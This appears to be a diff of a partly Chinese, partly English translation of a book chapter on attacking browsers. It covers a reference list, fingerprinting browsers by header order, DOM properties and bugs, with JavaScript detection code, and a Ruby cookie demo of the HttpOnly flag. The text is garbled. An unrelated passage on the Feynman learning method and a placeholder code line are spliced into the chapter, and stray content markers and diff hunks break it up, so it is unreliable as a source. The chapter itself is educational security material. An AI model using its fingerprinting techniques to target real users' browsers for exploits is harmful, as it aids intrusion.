+1. Mozilla. (2011). stringify- JavaScript | MDN. Retrieved November 15, 2013 from [`developer.mozilla.org/en-US/docs/JavaScript/Reference/Global\_Objects/JSON/stringify`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/stringify)
+2. Mozilla. (2013). HTML script element. Retrieved November 15, 2013 from [`developer.mozilla.org/en/docs/Web/HTML/Element/script`](https://developer.mozilla.org/en/docs/Web/HTML/Element/script)
+3. The jQuery Foundation. (2013). Selectors | jQuery API Documentation. Retrieved November 15, 2013 from [`api.jquery.com/category/selectors/`](http://api.jquery.com/category/selectors/)
+4. Microsoft. (2013). `attachEvent` method (Internet Explorer). Retrieved November 15, 2013 from [`msdn.microsoft.com/en-us/library/ie/ms536343(v=vs.85).aspx`](http://msdn.microsoft.com/en-us/library/ie/ms536343\(v=vs.85\).aspx)
+5. W3C. (2012). DOM Level 3 Events Specification: Focus Event Types. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#events-focusevent`](http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent)
+6. Google. (2013). Keyboard Shortcuts - Gmail Help. Retrieved November 15, 2013 from [`support.google.com/mail/answer/6594?hl=en`](http://support.google.com/mail/answer/6594?hl=en)
+7. W3C. (2013). DOM Level 3 Events Specification: Security Considerations. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#security-considerations-Security`](http://www.w3.org/TR/DOM-Level-3-Events/#security-considerations-Security)
+8. W3C. (2013). DOM Level 3 Events Specification: Key Values and Unicode. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#keys-unicode`](http://www.w3.org/TR/DOM-Level-3-Events/#keys-unicode)
+9. W3C. (2013). DOM Level 3 Events Specification: Guidelines for selecting and defining key values. Retrieved November 15, 2013 from [`www.w3.org/TR/DOM-Level-3-Events/#keys-Guide`](http://www.w3.org/TR/DOM-Level-3-Events/#keys-Guide)
+10. Jan Wolter. (2012). JavaScript Madness: Keyboard Events. Retrieved November 15, 2013 from [`unixpapa.com/js/key.html`](http://unixpapa.com/js/key.html)
+11. Wikipedia. (2013). Browser wars. Retrieved November 15, 2013 from [`en.wikipedia.org/wiki/Browser_wars`](http://en.wikipedia.org/wiki/Browser_wars)
+12. Caniuse. (2013). Pointer events. Retrieved November 15, 2013 from [`caniuse.com/pointer-events`](http://caniuse.com/pointer-events)
+13. Debasis Mohanty. (2005). Defeating Citi-Bank Virtual Keyboard Protection. Retrieved November 15, 2013 from [`seclists.org/bugtraq/2005/Aug/88`](http://seclists.org/bugtraq/2005/Aug/88)
+14. W3C. (2013). Touch Events. Retrieved November 15, 2013 from W3C. 2013. “Touch Events Version 1.” Accessed April 1, 2013. [`www.w3.org/TR/touch-events/`](http://www.w3.org/TR/touch-events/)
+15. Aza Raskin. (2010). Tabnabbing: A New Type of Phishing Attack. Retrieved November 15, 2013 from [`www.azarask.in/blog/post/a-new-type-of-phishing-attack/`](http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/)
+16. Sindre Sorhus. (2013). `Screenfull.js`. Retrieved November 15, 2013 from [`github.com/sindresorhus/screenfull.js`](https://github.com/sindresorhus/screenfull.js)
+17. Rosario Valotta. (2013). Abusing browsers user interfaces (for fun & profit). Retrieved November 15, 2013 from [`sites.google.com/site/tentacoloviola/abusing-browsers-gui`](https://sites.google.com/site/tentacoloviola/abusing-browsers-gui)
 18. Microsoft. (2013). 什么是用户帐户控制？2013 年 11 月 15 日检索自 `http://windows.microsoft.com/en-GB/windows-vista/what-is-user-account-control`。
-
 19. Microsoft. (2013). SmartScreen 过滤器。2013 年 11 月 15 日检索自 `http://windows.microsoft.com/en-GB/internet-explorer/products/ie-9/features/smartscreen-filter`。
-
 20. Symantec. (2013). Symantec Extended Validation 代码签名。2013 年 11 月 15 日检索自 `http://www.symantec.com/verisign/code-signing/extended-validation`。
-
 21. Sean Ludwig. (2012). Gmail 终于超过 Hotmail，成为全球最大的电子邮件服务 | VentureBeat。2013 年 11 月 15 日检索自 `http://venturebeat.com/2012/06/28/gmail-hotmail-yahoo-email-users/`。
-
 22. Microsoft. (2013). HTML 应用程序 (HTA) 入门。2013 年 11 月 15 日检索自 `http://msdn.microsoft.com/en-us/library/ms536496%28v=vs.85%29.aspx`。
-
 23. Sophos. (2009). 信任的力量（误置信任）：HTA 与安全。2013 年 11 月 15 日检索自 `http://nakedsecurity.sophos.com/2009/10/16/power-misplaced-trust-htas-insecurity/`。
-
 24. Mozilla. (2013). 启动式扩展。2013 年 11 月 15 日检索自 `https://developer.mozilla.org/en-US/docs/Extensions/Bootstrapped_extensions`。
-
 25. Michele Orrù and Luca Carettoni. (2013). 利用 XSS 和 BeEF 破坏云基础设施。2013 年 4 月 6 日访问。`http://blog.beefproject.com/2013/03/subverting-cloud-based-infrastructure.html`。
-
 26. Microsoft. (2013). 浏览器扩展劫持 Facebook 个人资料。2013 年 11 月 15 日检索自 `http://blogs.technet.com/b/mmpc/archive/2013/05/10/browser-extension-hijacks-facebook-profiles.aspx`。
-
 27. Wikipedia. (2013). 办公室助手。2013 年 11 月 15 日检索自 `http://en.wikipedia.org/wiki/Office_Assistant`。
-
 28. Alex McGeorge. (2013). 我们需要谈谈 Java。2013 年 11 月 15 日检索自 `http://seclists.org/dailydave/2013/q4/1`。
-
 29. Jeremiah Grossman. (2009). 检测隐身模式。2013 年 11 月 15 日检索自 `http://jeremiahgrossman.blogspot.com.au/2009/03/detecting-private-browsing-mode.html`。
-
 30. G. Aggarwal, E. Bursztein, C. Jackson, and D. Boneh. (2010). 现代浏览器中隐身模式的分析。2013 年 11 月 15 日检索自 `http://crypto.stanford.edu/~dabo/pubs/ppers/privatebrowsing.pdf`。
-
 31. Kyle Wilhoit. (2013). 那个没有哭的 SCADA。2013 年 11 月 15 日检索自 `https://media.blackhat.com/us-13/US-13-Wilhoit-The-SCADA-That-Didnt-Cry-Wolf-Whos-Really-Attacking-Your-ICS-Devices-Slides.pdf`。
-
 32. Ben Toews. (2012). 利用 XSS 攻击密码管理器。2013 年 11 月 15 日检索自 `http://btoe.ws/2012/04/25/Abusing-Password-Managers-with-XSS.html`。
-
 33. W3C. (2011). WebRTC 1.0：浏览器之间的实时通信。2013 年 11 月 15 日检索自 `http://dev.w3.org/2011/webrtc/editor/webrtc.html`。
-
 34. Mozilla. (2013). 媒体流 API。2013 年 11 月 15 日检索自 `https://developer.mozilla.org/en-US/docs/WebRTC/MediaStream_API`。
-
 35. Egor Homakov. (2013). Camjacking：点一下说奶酪。2013 年 11 月 15 日检索自 `http://homakov.blogspot.ru/2013/06/camjacking-click-and-say-cheese.html`。
-
 36. Wikipedia. (2013). Google Glass。2013 年 11 月 15 日检索自 `http://en.wikipedia.org/wiki/Google_Glass`。
 
-# 第 6 章
-
-# 攻击浏览器
+# 第 6 章 攻击浏览器
 
 浏览器是人们日常生活中进行众多活动的入口。从保持与朋友联系到决定在线游戏中的作物是否需要浇水，浏览器负责提供我们访问购物、银行、娱乐和信息的渠道。为了实现这一点，浏览器已经不再仅仅是查看网页的工具，而是演变为能够运行其他应用程序的应用本身。
 
 历史上，浏览器一直是攻击者的主要目标，因为它们需要支持众多功能。1 有趣的是，浏览器在安全方面的进步令人惊叹；安全如今被视为一种可销售的特性。以 Firefox 为例，如图 6-1 所示。
 
- start figure 
+<!-- start figure -->
 
 **Figure 6-1:** Firefox—快速、灵活、安全
 
 ![c06f001.eps](img/c06f001.png)
 
- end figure 
+<!-- end figure -->
 
 这并不意味着攻击者不再关注浏览器。相反，情况正好相反。攻击者（以及安全研究人员）正在大量精力投入对浏览器的攻击。甚至出现了公开竞赛，奖金丰厚，旨在发现浏览器最新版本的新颖漏洞。2 部分浏览器厂商提供奖金，以奖励发现浏览器漏洞的行为。3
 
 使浏览器成为更具吸引力的目标的原因是它们从桌面应用转向移动应用的转变。我们正处于无处不在连接的时代。你不必走下街就能看到有人在智能手机上发推特或在 Instagram 上发照片——通过分享、发布、评论、评价、研究或仅仅浪费时间，沉浸在无尽的互联网海洋中。
 
-随着人们越来越多地通过口袋里的设备访问更多网站和服务，对设备的信任也随之提升。在线银行和在线购物是两个跃跃欲试的领域。令人惊讶的是，移动在线商务的激增，特别是在线银行，最初出现在像非洲这样的发展中国家。4 在 20115 年，移动银行系统出现了繁荣，主要集中在非洲、亚洲和太平洋地区以及拉丁美洲，当时非洲约占系统的 30% 左右。
+随着人们越来越多地通过口袋里的设备访问更多网站和服务，对设备的信任也随之提升。在线银行和在线购物是两个跃跃欲试的领域。令人惊讶的是，移动在线商务的激增，特别是在线银行，最初出现在像非洲这样的发展中国家。4 在 2011<sup>5</sup> 年，移动银行系统出现了繁荣，主要集中在非洲、亚洲和太平洋地区以及拉丁美洲，当时非洲约占系统的 30% 左右。
 
 在本章中，你将学习如何直接对网页浏览器发起攻击。这意味着利用浏览器本身，忽略可能存在的任何扩展或插件。你将探索浏览器指纹、会话和 Cookie 的攻击、HTTPS 攻击，以及利用浏览器漏洞的更高级技术。
 
-# 浏览器指纹
+## 浏览器指纹
 
 在成功攻击浏览器之前，了解目标浏览器的类型和版本是极其有益的。确定这些信息的过程称为指纹。正如人们拥有独特的指纹，浏览器也有独特的属性，可以用来识别浏览器、版本和操作系统。如果要使用针对操作系统或设备的特定漏洞进行攻击，了解底层平台尤为重要。
-
-
-
 
 The term `fingerprinting` can actually be used to describe two different activities. The first is identifying the platform and version of a browser, but the secondary meaning is used when someone is trying to uniquely identify a specific browser from others. Identifying a unique browser is typically used to try to track an individual instead of just identifying the platform. Many other pieces of information are brought into this equation. However, for the purposes of this chapter, the term `fingerprinting` is defined as the act of determining the browser platform and version. For more information about tracking individual users, refer to the “Privacy Attacks” section in Chapter 5.
 
@@ -5971,25 +5942,25 @@ So, how do you narrow down the exact browser version a target is using? To answe
 
 `HTTP request headers` are information that is sent with every web request, which detail the supported features of the browser, the URL that is requested, as well as the host and other information. You can look at the header sent to help pick out differences from one browser to the next, as you will explore in the next section.
 
-By looking at the `DOM`, you can see what information the browser has stored about a page that’s being viewed. Because different browsers support different features, particularly those exposed within the DOM, this will help reveal what features a browser has. By comparing that to known features of browsers, you can narrow down the browser type and version further. By combining knowledge about how different aspects of the DOM fit together, you can identify multiple different aspects of the DOM that vary across platform and version, and then combine those to create a match.
+By looking at the `DOM`, you can see what information the browser has stored about a page that’s being viewed. Because different browsers support different features, particularly those exposed within the `DOM`, this will help reveal what features a browser has. By comparing that to known features of browsers, you can narrow down the browser type and version further. By combining knowledge about how different aspects of the `DOM` fit together, you can identify multiple different aspects of the `DOM` that vary across platform and version, and then combine those to create a match.
 
 You will also investigate how browser bugs can be used to identify a browser. As with most applications, browsers have inconsistencies and bugs from time to time. By looking at these features you can work out if a browser is above or below a certain patch level.
 
 By combining multiple pieces of information, you can determine that a browser might be above version 23 and below version 25, effectively narrowing it down to just a single version. This is the type of fine-tuning that brings you closer to what the actual version of a browser is, and with that information you can more specifically tailor attacks to a particular target.
 
-Combining information gathered from the browser’s `User-Agent` (`UA`) header and `DOM` properties is useful for validating your fingerprinting results. The `UA` header can be spoofed easily so it shouldn’t always be trusted by itself. If you hook a browser that includes “Firefox” in its `UA` header, but appears to have the `window.opera` property in the DOM, this browser may not in fact be Firefox. From this analysis you might deduce that it is in fact an Opera browser with a fake `UA` header. `DOM` properties can be spoofed too, but it’s not as simple, nor as common, as changing the `UA` header. If you add some checks for browser bugs, in addition to `DOM` properties and `UA` headers, you should be able to reliably ascertain what type of browser you’re attacking.
+Combining information gathered from the browser’s `User-Agent` (`UA`) header and `DOM` properties is useful for validating your fingerprinting results. The `UA` header can be spoofed easily so it shouldn’t always be trusted by itself. If you hook a browser that includes “Firefox” in its `UA` header, but appears to have the `window.opera` property in the `DOM`, this browser may not in fact be Firefox. From this analysis you might deduce that it is in fact an Opera browser with a fake `UA` header. `DOM` properties can be spoofed too, but it’s not as simple, nor as common, as changing the `UA` header. If you add some checks for browser bugs, in addition to `DOM` properties and `UA` headers, you should be able to reliably ascertain what type of browser you’re attacking.
 
-## Fingerprinting using HTTP Headers
+### Fingerprinting using HTTP Headers
 
 Headers are included in every HTTP request and response, as touched on briefly in the “HTTP Headers” section of Chapter 1. These headers help the browser and the server agree on how information will be transferred, as well as share information about web pages and data that are beyond the scope of the contents of the page. The type of things that browsers and servers discuss is a topic that isn’t for those weak in constitution. They tend to dismiss the pleasantries and get down to the bare essentials pretty quickly. Let’s take a look at Figure 6-2 to understand what makes up a web request.
 
- start figure 
+<!-- start figure -->
 
 **Figure 6-2:** Browser headers observed at echo.opera.com
 
 ![c06f002.tif](img/c06f002.png)
 
- end figure 
+<!-- end figure -->
 
 By visiting [`echo.opera.com`](http://echo.opera.com), you can view the headers that your browser sends to the server within the request. The top line is frequently called the request line. It consists of a verb, a location, and a protocol version. The verb is what you want to do. These are typically either `GET`, `POST`, or `HEAD`. In the context of fingerprinting, the verb, location, and protocol don’t matter as much as the rest of the information. You can see in Figure 6-2 that the `Host` header is first, and it is specifying that the host that you are connecting to is echo.opera.com. The fact that the `Host` header is first is important, as you’ll see further on.
 
@@ -5999,13 +5970,13 @@ The rest of the headers indicate communication parameters. The `Accept` header i
 
 Take a look at Figure 6-3, which is the same page on a different platform, and try to spot the differences with Figure 6-2.
 
- start figure 
+<!-- start figure -->
 
 **Figure 6-3:** Results of echo.opera.com viewed through IE 6 on Windows XP
 
 ![c06f003.tif](img/c06f003.png)
 
- end figure 
+<!-- end figure -->
 
 You can tell from the icon that this was taken on a Windows box running Internet Explorer. As you dig in, you see a number of other things that help identify not just the browser, but the software that’s installed on the system. Looking at the `User-Agent` headers here, you see that this is IE 6 on Windows XP, but that’s not all: the `User-Agent` is also listing the web-based enhancements that have been installed into IE.
 
@@ -6015,15 +5986,13 @@ Take note of the order of each header item, and notice the position of the `Host
 
 To make life a little more interesting, not all versions of IE send the headers in the same order. Take a look at IE 8 on Windows 7, as shown in Figure 6-4.
 
- start figure 
+<!-- start figure -->
 
 **Figure 6-4:** Results of echo.opera.com viewed through IE8 on Windows 7
 
 ![c06f004.tif](img/c06f004.png)
 
- end figure 
-
-
+<!-- end figure -->
 
 你可能会注意到一些相似之处，特别是`Accept`和`Accept-Language`头部的位置，它们在`User-Agent`头部之前。`Host`头部仍然是倒数第二个项目。但是，`Accept-Encoding`头部已经移动了。`User-Agent`也在提供一些更新的信息。你可以看到布局引擎被列为`Trident/4.0`，新特性如`Media Center PC`和`SLCC2`也被列为可用特性。你还可以看到`Accept`字段列出的内容与 IE 6 不同。
 
@@ -6031,11 +6000,16 @@ To make life a little more interesting, not all versions of IE send the headers 
 
 你可能也注意到，`User-Agent`字符串似乎包含了底层操作系统的描述符，例如`Windows NT 6.1`。虽然确定浏览器下方的桌面操作系统相对简单，因为操作系统组合的数量有限，但当涉及移动设备时，这种复杂性会大幅增加。
 
-`MobileESP`项目由 Anthony Hand 开发，旨在提供一个轻量级的移动设备检测 API。`MobileESP`支持多种语言，包括 ASP.NET、Ruby、Python 和 PHP，因此被认为相当可移植。项目还提供一个开源 JavaScript 库，用于在客户端有限度地检测移动设备。`mdetect.js`库通过包含来自约 75 种不同移动设备的 User-Agent 字符串列表来工作。库然后暴露了一系列 JavaScript 函数，可用于设备判断；例如，以下代码演示了如何检测 iPhone：
+`MobileESP`项目由 Anthony Hand 开发，旨在提供一个轻量级的移动设备检测 API。`MobileESP`支持多种语言，包括 ASP.NET、Ruby、Python 和 PHP，因此被认为相当可移植。项目还提供一个开源 JavaScript 库，用于在客户端有限度地检测移动设备。`mdetect.js`库通过包含来自约 75 种不同移动设备的 `User-Agent` 字符串列表来工作。库然后暴露了一系列 JavaScript 函数，可用于设备判断；例如，以下代码演示了如何检测 iPhone：
 
-```
+
+
+
+```javascript
 var deviceIphone = "iphone";
+
 var deviceIpod = "ipod";
+
 var deviceIpad = "ipad";
 
 function DetectIphone()
@@ -6066,13 +6040,10 @@ DOM 不仅存储显示在屏幕上的文档信息，还包含如分辨率、导�
 
 在查询 DOM 属性时，你可能会收到以下四种响应之一：
 
-*   未定义，因为属性不存在
-
-*   为 null 或 NaN，因为未设置
-
-*   未知，用于已废弃的属性或需要 ActiveX（仅限 Internet Explorer）的属性
-
-*   属性的实际值
+* 未定义，因为属性不存在
+* 为 null 或 NaN，因为未设置
+* 未知，用于已废弃的属性或需要 ActiveX（仅限 Internet Explorer）的属性
+* 属性的实际值
 
 你需要检查返回的值，但希望每个检查都返回 true 或 false。为此，你可以使用类似`!window.devicePixelRatio`的语句来判断属性是否存在。如果属性存在，该表达式返回 false；如果不存在，返回 true。这是一种反直觉的检查方式，因此为了获得更直观的答案，使用双重否定，如`!!window.devicePixelRatio`。双重否定会返回 true 表示属性存在，false 表示不存在。这使得在构建查询时更加清晰，并确保每个查询的结果只有 true 或 false。
 
@@ -6080,61 +6051,56 @@ DOM 不仅存储显示在屏幕上的文档信息，还包含如分辨率、导�
 
 Firefox 18.0 的发布中，Mozilla 将`devicePixelRatio`作为新 DOM 属性加入。7 你不必感到惊讶，该属性与显示网页内容有关。为什么你需要关注它？因为在指纹识别中，你不关心它的功能，只关心该属性在 Firefox 17.0 中不存在，而在下一个主版本 Firefox 18.0 中存在（如 Figure 6-5 所示的发布说明）。
 
- start figure 
+start figure
 
 **Figure 6-5:** Firefox 发布说明显示该属性的添加。
 
 ![c06f005.eps](img/c06f005.png)
 
- end figure 
+end figure
 
 现在你已经掌握了这些知识，让我们来应用它进行指纹识别。从 Mozilla 发布服务器[`ftp.mozilla.org/pub/mozilla.org/firefox/releases/`](https://ftp.mozilla.org/pub/mozilla.org/firefox/releases/)下载 Firefox 17 和 18 版本。安装这两个全新版本的 Firefox 后，在两个版本上安装 Firebug 扩展。你可以从[`getfirebug.com/`](http://getfirebug.com/)获取 Firebug。Firebug 将让你查看 DOM 元素并查询元素。
 
 打开 Firebug，进入 Console 标签页，确保勾选“Show Command Editor”选项，如 Figure 6-6 所示。你应该在屏幕右下角看到一个新的文本块，底部附带四个按钮：Run、Clear、Copy 和 History。
 
- start figure 
+start figure
 
 **Figure 6-6:** 启用 Firebug 命令编辑器面板
 
 ![c06f006.eps](img/c06f006.png)
 
- end figure 
+end figure
 
 在两个 Firefox 版本的 Firebug 控制台中分别执行`!!window.devicePixelRatio`。你会看到相反的布尔值返回。在 Firefox 17 上执行该语句会返回 false 布尔值，如 Figure 6-7 所示。
 
- start figure 
+start figure
 
 **Figure 6-7:** 查看 Firefox 17 中的 devicePixelRatio 检查
 
 ![c06f007.tif](img/c06f007.png)
 
- end figure 
+end figure
 
 在 Firefox 18 上执行该语句会返回 true 布尔值，如 Figure 6-8 所示。
 
- start figure 
+start figure
 
 **Figure 6-8:** 查看 Firefox 18 中的 devicePixelRatio 检查
 
 ![c06f008.tif](img/c06f008.png)
 
- end figure 
+end figure
 
 需要注意的是，这并非针对 Firefox 18 的测试。该测试会告诉你：如果浏览器是 Firefox（它可能不是），那么版本号大于或等于 18（如果返回 true）；或者版本号小于 18（如果返回 false）。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```javascript
 if (condVar > someVal) {console.log("xxx")}
 ```
-[/content]
 
-[content]
 为了实践，你可以把这段知识封装成一个 JavaScript 函数，用于识别特定版本的 Firefox。查看 Firefox 的发布说明，除了 Firefox 18 的变更外，Firefox 21 版本还增加了 `window.crypto.getRandomValues` 的额外属性。通过两次检查，你可以很容易地缩小浏览器版本的可能范围：
 
 ```javascript
@@ -6155,13 +6121,13 @@ function fingerprint_FF(){
 
 使用这个 JavaScript，你可以通过两次检查判断浏览器是否等于或大于 21 版，等于或大于 18 版，或者小于 17 版。要进一步精确到具体版本还需要更多信息，但通过组合多个检查，可以逐步实现对浏览器版本的更细粒度识别，如你在 Figure 6-9 中所见。
 
-start figure 
+start figure
 
 **Figure 6-9:** Alert 框显示 Firefox 版本大于 21。
 
 ![c06f009.tif](img/c06f009.png)
 
-end figure 
+end figure
 
 这些推断不过是一种基于提供的细节进行估算的过程。在几个假设性例子中，网页浏览器开发者可能会在版本 25 移除 `devicePixelRatio` 属性，甚至在 Firefox 17.9 中添加它。这些变化可能导致你的检测算法出现假阳或假阴，因此请记住这只是一种估算，而非绝对确定。
 
@@ -6180,7 +6146,6 @@ window.opera = opera;
 ```
 >window.opera
 Object {isOpera: true}
-
 >!!window.opera
 true
 ```
@@ -6193,13 +6158,13 @@ true
 
 不同浏览器会有不同的、固有于浏览器本身的变量值，这些值不容易被更改。这一点很重要，因为更改 User-Agent 字符串非常容易。例如，Firefox 有很多扩展程序可以轻松更改 User-Agent。这在 Figure 6-10 中有所展示，其中 User-Agent 已被更改为 Internet Explorer，但通过查看 DOM 变量，你仍然可以确定你在使用 Firefox。
 
-start figure 
+start figure
 
 **Figure 6-10:** 使用 Firebug 控制台获取浏览器信息
 
 ![c06f010.tif](img/c06f010.png)
 
-end figure 
+end figure
 
 尽管在 Figure 6-10 中 User-Agent 已被更改为 Internet Explorer，但 `window.navigator` 数据实际上同时包含修改后的值和真实值。`appName` 字段包含修改后的值，而 `userAgent` 字段仍保留真实的 User-Agent。通过这种信息，你可以揭示真实的浏览器版本，以及语言和操作系统等其他重要信息。
 
@@ -6218,7 +6183,6 @@ function testVuln(){
  return !!document.implementation.createHTMLDocument(undefined)
   .querySelector("title").textContent ;
 }
-
 alert(testVuln())
 ```
 
@@ -6257,12 +6221,8 @@ if(browser == "Firefox")
 {
   version = ">=10";
 }
-
 alert(browser + ":" + version);
 ```
-
-
-
 
 在这段示例中，第一个测试会检查隐藏变量，并根据浏览器将平台设置到浏览器变量中。随后，在确定为浏览器平台后，会检查 Firefox 中使用模板 HTML 元素的情况。该特性在 Firefox 22 中引入，因此其存在表明版本至少为 22。或者，如果没有模板元素，则可以推断版本早于 22。
 
@@ -6284,17 +6244,12 @@ Web 应用请求浏览器在特定时间内存储一段信息。当浏览器重�
 
 Cookie 数据在浏览器和 Web 应用之间双向传输。要在浏览器中设置 Cookie，应用必须发送一个 Set-Cookie 响应头，其中包含 Cookie 的详细信息，包括：
 
-*   Cookie 的名称
-
-*   Cookie 的值
-
-*   Cookie 失效的时间
-
-*   Cookie 适用的路径
-
-*   Cookie 适用的域
-
-*   其他 Cookie 属性
+* Cookie 的名称
+* Cookie 的值
+* Cookie 失效的时间
+* Cookie 适用的路径
+* Cookie 适用的域
+* 其他 Cookie 属性
 
 本节将探讨 Set-Cookie 请求的不同属性，帮助你理解随后的 Cookie 攻击。
 
@@ -6302,55 +6257,79 @@ Cookie 数据在浏览器和 Web 应用之间双向传输。要在浏览器中�
 
 ```
 require 'rubygems'
+```
+
+
+
+```ruby
 require 'thin'
+
 require 'rack'
+
 require 'sinatra'
+
 require 'json'
 
 class CookieDemo < Sinatra::Base
+
   get "/" do
+
     response.set_cookie "session_cookie", {:value => 'yes',
+
       :domain => 'browserhacker.com', 
+
       :path => '/' ,  :httponly => true}
+
     response.set_cookie "persistent_cookie", {:value => 'yes',
+
       :domain => 'browserhacker.com', 
+
       :path => '/' , :httponly => true ,
+
       :expires => Time.now + (60 * 60 * 7) }
+
     "\n" +  request.cookies.to_json + "\n\n"
+
   end
+
 end
 
 @routes = {
+
     "/" => CookieDemo.new
+
 }
 
 @rack_app = Rack::URLMap.new(@routes)
+
 @thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)
 
 Thin::Logging.silent = true
+
 Thin::Logging.debug = false
 
 puts "[#{Time.now}] Thin ready"
+
 @thin.start
 ```
 
-你可以使用 curl 查看 Cookie 如何被发送。例如：
+你可以使用 `curl` 查看 Cookie 如何被发送。例如：
 
 ```
 curl -c cookiejar -b cookiejar -v http://browserhacker.com 
 ```
 
-执行后，Cookie 会被存储在 cookiejar 文件中，随后的请求会使用该文件。下面的图示（Figure 6-11）展示了如果多次发送相同请求会发生什么：
+执行后，Cookie 会被存储在 `cookiejar` 文件中，随后的请求会使用该文件。下面的图示（Figure 6-11）展示了如果多次发送相同请求会发生什么：
 
- start figure 
+start figure 
 
 **Figure 6-11:** 设置并发送 Cookie
 
 ![c06f011.tif](img/c06f011.png)
 
- end figure 
+end figure 
 
-如所示，Cookie 以 `cookiename=value` 形式在请求中发送，字段之间用分号（;）分隔。当应用发送 Cookie 时，每个 Set-Cookie 都占据单独一行。会话 Cookie（session_cookie）和持久 Cookie（persistent_cookie）几乎相同，唯一的区别是会话 Cookie 没有 Expires 属性，而持久 Cookie 的 Expires 时间比会话 Cookie 晚 7 小时。
+如所示，Cookie 以 `cookiename=value` 形式在请求中发送，字段之间用分号（`;`）分隔。当应用发送 Cookie 时，每个 `Set-Cookie` 都占据单独一行。会话 Cookie（`session_cookie`）和持久 Cookie（`persistent_cookie`）几乎相同，唯一的区别是会话 Cookie 没有 `Expires` 属性，而持久 Cookie 的 `Expires` 时间比会话 Cookie 晚 7 小时。
 
 ## 理解属性
 
@@ -6358,7 +6337,7 @@ Cookie 属性帮助确定 Cookie 何时应返回到服务器以及 Cookie 应该
 
 ### 理解 Expires 属性
 
-Expires 属性帮助浏览器确定 Cookie 应保留多久。Cookie 可以跨浏览器重启保持存在，也可以在浏览器关闭时立即自毁。若不设置 Expires 属性，则可以保证 Cookie 永不会写入磁盘，浏览器关闭后数据即被销毁。这常用于登录会话等不希望数据跨重启保存的场景。
+`Expires` 属性帮助浏览器确定 Cookie 应保留多久。Cookie 可以跨浏览器重启保持存在，也可以在浏览器关闭时立即自毁。若不设置 `Expires` 属性，则可以保证 Cookie 永不会写入磁盘，浏览器关闭后数据即被销毁。这常用于登录会话等不希望数据跨重启保存的场景。
 
 在用户跟踪场景中，会话 Cookie 并不理想。如果应用希望每次用户返回时都能识别其身份，持久 Cookie 更合适。持久 Cookie 设置一个在未来某一时刻失效的日期，失效时间可从几秒后到非常遥远的未来，使 Cookie 存活时间长于用户。
 
@@ -6366,25 +6345,22 @@ Expires 属性帮助浏览器确定 Cookie 应保留多久。Cookie 可以跨浏
 
 ### 理解 HttpOnly 标志
 
-HttpOnly 标志可以防止 Cookie 被 JavaScript 和其他脚本语言访问。该标志告诉浏览器仅通过 HTTP 协议传输 Cookie，且不在文档对象模型（DOM）中可访问。这能够阻止 XSS 攻击将 Cookie 数据发送到外部，也能防止在渲染的 HTML 代码中修改 Cookie。我们在此基础上延伸之前的代码示例，进一步探讨该标志。
+`HttpOnly` 标志可以防止 Cookie 被 JavaScript 和其他脚本语言访问。该标志告诉浏览器仅通过 HTTP 协议传输 Cookie，且不在文档对象模型（DOM）中可访问。这能够阻止 XSS 攻击将 Cookie 数据发送到外部，也能防止在渲染的 HTML 代码中修改 Cookie。我们在此基础上延伸之前的代码示例，进一步探讨该标志。
 
+- [Ruby 脚本](https://example.org) 设置了两个带有 `HttpOnly` 标记的会话 Cookie，可以通过在 DOM 中尝试访问 Cookie 来验证。打开 Firebug 控制台，在命令编辑器中输入 `document.cookie` 并点击运行。这应该返回一个空值，类似于 Figure 6-12。
 
-
-
--   [Ruby 脚本](https://example.org) 设置了两个带有 HttpOnly 标记的会话 Cookie，可以通过在 DOM 中尝试访问 Cookie 来验证。打开 Firebug 控制台，在命令编辑器中输入 document.cookie 并点击运行。这应该返回一个空值，类似于 Figure 6-12。
-
- start figure 
+start figure 
 
 **Figure 6-12:** 使用控制台查看 Cookie
 
 ![c06f012.tif](img/c06f012.png)
 
- end figure 
+end figure 
 
--   为了验证相反的情况，需要禁用 HttpOnly 标记。为此，修改 setcookie 函数的最后一个参数，使其不启用 HttpOnly 标记。更新后的代码如下：
+- 为了验证相反的情况，需要禁用 `HttpOnly` 标记。为此，修改 `setcookie` 函数的最后一个参数，使其不启用 `HttpOnly` 标记。更新后的代码如下：
 
-```
-```class CookieDemo < Sinatra::Base
+```ruby
+class CookieDemo < Sinatra::Base
   get "/" do
     response.set_cookie "session_cookie", {:value => 'yes',
       :domain => 'browserhacker.com',
@@ -6397,95 +6373,113 @@ HttpOnly 标志可以防止 Cookie 被 JavaScript 和其他脚本语言访问。
 end
 ```
 
-```
--   重新加载页面后，再次在 Firebug 控制台中执行 document.cookie 命令。此次返回的结果应包含 Cookie 信息，如 Figure 6-13 所示。
+- 重新加载页面后，再次在 Firebug 控制台中执行 `document.cookie` 命令。此次返回的结果应包含 Cookie 信息，如 Figure 6-13 所示。
 
- start figure 
+start figure 
 
 **Figure 6-13:** 使用控制台查看不带 HttpOnly 的 Cookie
 
 ![c06f013.tif](img/c06f013.png)
 
- end figure 
+end figure 
 
--   这说明如果能在浏览器中诱导任意 JavaScript 代码执行，就可以在没有 HttpOnly 标记的情况下访问 Cookie。即使启用了 HttpOnly，也可以通过其他方式使用这些 Cookie，更高级的攻击在第 9 章“通过浏览器代理”部分有所讨论。
+- 这说明如果能在浏览器中诱导任意 JavaScript 代码执行，就可以在没有 `HttpOnly` 标记的情况下访问 Cookie。即使启用了 `HttpOnly`，也可以通过其他方式使用这些 Cookie，更高级的攻击在第 9 章“通过浏览器代理”部分有所讨论。
 
 ### 理解 Secure 标记
 
-假设在 browserhacker.com 的电子商务应用需要跟踪购物车中的商品，并在用户访问结账页面后进行一次身份验证以完成交易。此时，使用 Secure 标记可以让 Cookie 仅通过 HTTPS 版本的站点传输，从而进一步保护结账功能的 Cookie。
